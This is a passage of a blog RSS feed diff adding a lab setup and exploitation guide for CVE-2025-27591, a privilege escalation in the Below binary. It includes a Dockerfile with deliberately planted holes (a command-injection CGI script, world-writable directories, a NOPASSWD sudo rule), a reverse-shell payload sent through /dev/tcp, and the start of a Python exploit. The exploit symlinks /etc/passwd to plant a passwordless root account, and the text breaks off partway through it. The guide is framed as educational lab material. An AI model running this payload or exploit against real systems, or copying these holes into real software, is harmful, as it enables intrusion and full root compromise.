@@ -6,8 +6,309 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 17 Jul 2025 11:27:17 +0100</lastBuildDate>
+        <lastBuildDate>Tue, 25 Nov 2025 22:10:00 +0100</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CVE-2025-27591 Lab Setup and Exploitation Guide</title>
+            <link>/posts/cve_2025_27591/</link>
+            <pubDate>Tue, 25 Nov 2025 22:10:00 +0100</pubDate>
+            
+            <guid>/posts/cve_2025_27591/</guid>
+            <description>Introduction This guide demonstrates how to set up a vulnerable Docker lab environment to study CVE-2025-27591, a privilege escalation vulnerability in the Below binary. The lab combines a vulnerable Apache server with a CGI script as a controlled entry point.
+The lab is intended for educational purposes only, and it provides an isolated environment to practice exploitation techniques, reverse shells, and privilege escalation without affecting your host system.
+By the end of this guide, you will have:</description>
+            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>This guide demonstrates how to set up a vulnerable Docker lab environment to study <strong>CVE-2025-27591</strong>, a privilege escalation vulnerability in the <code>Below</code> binary. The lab combines a vulnerable Apache server with a CGI script as a controlled entry point.</p>
+<p>The lab is intended for <strong>educational purposes only</strong>, and it provides an isolated environment to practice exploitation techniques, reverse shells, and privilege escalation without affecting your host system.</p>
+<p>By the end of this guide, you will have:</p>
+<ul>
+<li>A running Docker container simulating a vulnerable server</li>
+<li>An entry point through a CGI vulnerability</li>
+<li>A working exploit to escalate privileges via the Below binary</li>
+</ul>
+<hr>
+<h2 id="lab-setup">Lab Setup</h2>
+<h3 id="1-download-the-dockerfile">1. Download the Dockerfile</h3>
+<p>Download the lab Dockerfile (included at the bottom of this document). This Dockerfile builds a container with:</p>
+<ul>
+<li>A vulnerable Apache server</li>
+<li>A CGI script with command injection</li>
+<li>The <code>Below</code> binary compiled from source</li>
+<li>World-writable log directories for CVE-2025-27591 exploitation</li>
+</ul>
+<hr>
+<h3 id="2-build-the-docker-image">2. Build the Docker Image</h3>
+<p>Run the following command to build the Docker image:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo docker build -t cve_2025_27591 .
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/docker_build.png"  alt="Docker build output"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>This command will take a few minutes as it compiles the <code>Below</code> binary from source.</p>
+<hr>
+<h3 id="3-run-the-container">3. Run the Container</h3>
+<p>Start the container with elevated privileges and host networking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo docker run -d --rm --name cve_2025_27591_container --privileged --network host --tmpfs /run --tmpfs /run/lock cve_2025_27591
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/docker_run.png"  alt="Docker run container"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>This creates a fully isolated lab with root-equivalent access to the container.</p>
+<hr>
+<h3 id="4-access-the-vulnerable-apache-server">4. Access the Vulnerable Apache Server</h3>
+<p>Inside the container, Apache runs on <strong>port 80</strong> and exposes the vulnerable CGI script. This script serves as our entry point for executing commands.</p>
+
+    <img src="/CVE_2025_27591/web_page.png"  alt="Apache server running"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+<h3 id="5-stop-and-clean-the-container">5. Stop and Clean the Container</h3>
+<p>Once finished with the lab, stop the container and remove the image to clean up:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo docker stop cve_2025_27591_container <span style="color:#f92672">&amp;&amp;</span> sudo docker rmi cve_2025_27591
+</span></span></code></pre></div><hr>
+<h2 id="exploitation">Exploitation</h2>
+<p>The exploitation process has two main steps:</p>
+<ol>
+<li>Gain initial access via the <strong>CGI vulnerability</strong>.</li>
+<li>Escalate privileges using the <strong>Below binary exploit</strong>.</li>
+</ol>
+<hr>
+<h3 id="step-1-netcat-listener">Step 1: Netcat Listener</h3>
+<p>Start a listener on your host machine to catch the reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/nc_1.png"  alt="Netcat listener"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+<h3 id="step-2-trigger-reverse-shell">Step 2: Trigger Reverse Shell</h3>
+<p>Send a request to the vulnerable CGI script to spawn a reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>http://localhost/cgi-bin/vuln.sh?cmd=bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/nc_2.png"  alt="Reverse shell via CGI"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Check your netcat listener; you now have a shell as the <strong>www-data</strong> user inside the container.</p>
+<hr>
+<h3 id="step-3-identify-users">Step 3: Identify Users</h3>
+<p>Check which users exist on the system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/passwd.png"  alt="List users"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>Notice the presence of another user, <strong>user_1</strong>, who may have additional privileges.</p>
+<hr>
+<h3 id="step-4-switch-user-and-check-privileges">Step 4: Switch User and Check Privileges</h3>
+<p>Switch to <code>user_1</code> and list sudo privileges:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su user_1
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/privs.png"  alt="User_1 privileges"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p><code>user_1</code> can execute the <code>Below</code> binary with <strong>NOPASSWD</strong>, which is critical for privilege escalation.</p>
+<hr>
+<h3 id="step-5-transfer-the-exploit">Step 5: Transfer the Exploit</h3>
+<p>Start a Python HTTP server to host the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>Download the exploit inside the container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://localhost:4444/CVE_2025_27591.py
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/wget.png"  alt="Fetching exploit"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+<h3 id="step-6-execute-the-exploit">Step 6: Execute the Exploit</h3>
+<p>Run the Python exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 CVE_2025_27591.py
+</span></span></code></pre></div>
+    <img src="/CVE_2025_27591/exploit.png"  alt="Running exploit"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>This will leverage the <code>Below</code> binary vulnerability and spawn a <strong>root shell</strong> inside the container.</p>
+<hr>
+<h3 id="step-8-clean-up">Step 8: Clean Up</h3>
+<p>After completing the lab:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo docker stop cve_2025_27591_container <span style="color:#f92672">&amp;&amp;</span> sudo docker rmi cve_2025_27591
+</span></span></code></pre></div><hr>
+<h3 id="notes">Notes</h3>
+<ul>
+<li>The lab is <strong>isolated</strong> and safe to experiment with.</li>
+<li>The CGI script is <strong>vulnerable by design</strong> to demonstrate exploitation concepts.</li>
+<li>Always practice responsible disclosure if you discover vulnerabilities outside this lab.</li>
+</ul>
+<hr>
+<h2 id="ressources">Ressources</h2>
+<h3 id="dockerfile">Dockerfile</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="display:flex;"><span><span style="color:#75715e"># Builder stage: Rust toolchain</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> rust:1.76-slim AS builder</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Install system dependencies for building below (libbpf, LLVM, etc.)</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    apt-get install -y --no-install-recommends <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>      build-essential git pkg-config libssl-dev ca-certificates <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>      libelf-dev zlib1g-dev clang llvm <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    rm -rf /var/lib/apt/lists/*<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /opt/below</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Clone and select version</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> git clone https://github.com/facebookincubator/below.git /opt/below<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cd /opt/below <span style="color:#f92672">&amp;&amp;</span> git checkout v0.8.1<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Install LLVM/Clang 15 for eBPF builds</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    apt-get install -y clang-15 llvm-15 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    update-alternatives --install /usr/bin/clang clang /usr/bin/clang-15 <span style="color:#ae81ff">100</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    update-alternatives --install /usr/bin/llvm-config llvm-config /usr/bin/llvm-config-15 <span style="color:#ae81ff">100</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rustup component add rustfmt<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Build Rust binary in release mode</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cd /opt/below <span style="color:#f92672">&amp;&amp;</span> cargo build --release<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Runtime stage</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> debian:bookworm</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> DEBIAN_FRONTEND<span style="color:#f92672">=</span>noninteractive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install runtime tools + Apache + CGI</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    apt-get install -y <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>      apt-utils ca-certificates gnupg wget curl nano vim less man-db <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>      iproute2 net-tools iputils-ping dnsutils python3 python3-pip python3-venv <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>      bash sudo apache2 apache2-utils<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Enable Apache CGI</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> a2enmod cgi<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Create world-writable CGI folder (intentional vulnerability)</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /usr/lib/cgi-bin <span style="color:#f92672">&amp;&amp;</span> chmod -R <span style="color:#ae81ff">777</span> /usr/lib/cgi-bin<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Vulnerable CGI script</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cat &lt;&lt; <span style="color:#e6db74">&#39;EOF&#39;</span> &gt; /usr/lib/cgi-bin/vuln.sh<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e">#!/bin/bash</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>echo <span style="color:#e6db74">&#34;Content-Type: text/plain&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>echo <span style="color:#e6db74">&#34;&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">cmd</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>QUERY_STRING#cmd=<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">cmd</span><span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -e <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>sed <span style="color:#e6db74">&#39;s/+/ /g;s/%\(..\)/\\x\1/g;&#39;</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#e6db74">&#34;</span>$cmd<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>echo <span style="color:#e6db74">&#34;[Executing] </span>$cmd<span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>/bin/bash -c <span style="color:#e6db74">&#34;</span>$cmd<span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>EOF<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod <span style="color:#ae81ff">755</span> /usr/lib/cgi-bin/vuln.sh<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Simple landing page</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /var/www/html<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cat &lt;&lt; <span style="color:#e6db74">&#39;EOF&#39;</span> &gt; /var/www/html/index.html<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;!DOCTYPE html&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;html&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;head&gt;&lt;title&gt;Lab Start&lt;/title&gt;&lt;/head&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;body&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    &lt;h1&gt;Vulnerable Lab <span style="color:#66d9ef">for</span> CVE‑2025‑27591&lt;/h1&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    &lt;p&gt;Start here: http://IP/cgi-bin/vuln.sh?cmd<span style="color:#f92672">=</span>COMMAND&lt;/p&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;/body&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;/html&gt;<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>EOF<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Copy built binary</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --from<span style="color:#f92672">=</span>builder /opt/below/target/release/below /usr/local/bin/below<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># World-writable log directory (intentional vulnerability)</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir -p /var/log/below <span style="color:#f92672">&amp;&amp;</span> chmod <span style="color:#ae81ff">0777</span> /var/log/below<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Create non‑privileged user</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> useradd -m -u <span style="color:#ae81ff">1000</span> -s /bin/bash user_1 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    passwd -d user_1 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    chown -R user_1:user_1 /home/user_1<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> HOME<span style="color:#f92672">=</span>/home/user_1<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENV</span> PATH<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/local/bin:</span><span style="color:#e6db74">${</span>PATH<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Allow user_1 to run &#34;below&#34; as root without password (intentional vuln)</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> deluser user_1 sudo <span style="color:#f92672">||</span> true<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#39;/user_1/d&#39;</span> /etc/sudoers <span style="color:#f92672">&amp;&amp;</span> rm -f /etc/sudoers.d/user_1<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo <span style="color:#e6db74">&#34;user_1 ALL=(ALL) NOPASSWD: /usr/local/bin/below&#34;</span> &gt; /etc/sudoers.d/user_1 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    chmod <span style="color:#ae81ff">0440</span> /etc/sudoers.d/user_1<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 80</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Start Apache and keep container alive</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> service apache2 start <span style="color:#f92672">&amp;&amp;</span> tail -f /dev/null<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h3 id="exploit">Exploit</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>B <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/local/bin/below&#34;</span>
+</span></span><span style="display:flex;"><span>D <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/log/below&#34;</span>
+</span></span><span style="display:flex;"><span>L <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>D<span style="color:#e6db74">}</span><span style="color:#e6db74">/error_root.log&#34;</span>
+</span></span><span style="display:flex;"><span>T <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/attacker&#34;</span>
+</span></span><span style="display:flex;"><span>P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;attacker::0:0:attacker:/root:/bin/bash</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fail</span>():
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">vulnerable</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(D):
+</span></span><span style="display:flex;"><span>        fail()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (os<span style="color:#f92672">.</span>stat(D)<span style="color:#f92672">.</span>st_mode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0o002</span>):
+</span></span><span style="display:flex;"><span>        fail()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(L):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>islink(L):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            os<span style="color:#f92672">.</span>remove(L)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>symlink(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, L)
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>remove(L)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
